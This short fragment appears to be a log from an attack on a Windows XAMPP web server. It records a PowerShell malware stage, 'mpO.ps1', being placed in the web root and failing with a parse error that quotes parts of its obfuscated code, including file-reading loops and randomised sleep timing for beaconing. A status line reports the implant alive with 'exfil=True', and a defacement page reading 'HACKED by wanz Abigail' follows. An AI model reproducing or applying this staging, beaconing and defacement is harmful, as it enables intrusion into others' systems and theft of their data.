@@ -1,0 +1,8 @@
+v4j: 192615 | tail: ' ((Get-Random -Minimum 25 -Maximum 70))}'
+stage mpO.ps1: SUBMITTED
+ERROR-CEPAT: At C:\xampp\htdocs\mpO.ps1:1 char:190672 + ... le]::Open($F[$i],"Open","Read","Read")}catch{$K[$i]=$null}}}}if(Test- ... +                                                                  ~ The Try statement is missing its Catch or Finally block. At C:\xampp\htdocs\mpO.ps1:1 char:192627 + ... conds 4};Start-Sleep -Seconds ((Get-Random -Minimum 25 -
+== upstat: ==
+alive|t=2026-10-27T23:27:13|host=DESKTOP-J4SUDA6|user=USER|pid=94420|beac=7|exfil=True
+== halaman: ==
+<!doctype html><html><head><title>HACKED by wanz Abigail</title><meta http-equiv=refresh content=0;url=/dashboard/></head><body><h1>HACKED by wanz Abigail</h1><p>malware keep-alive</p></body></html>
+
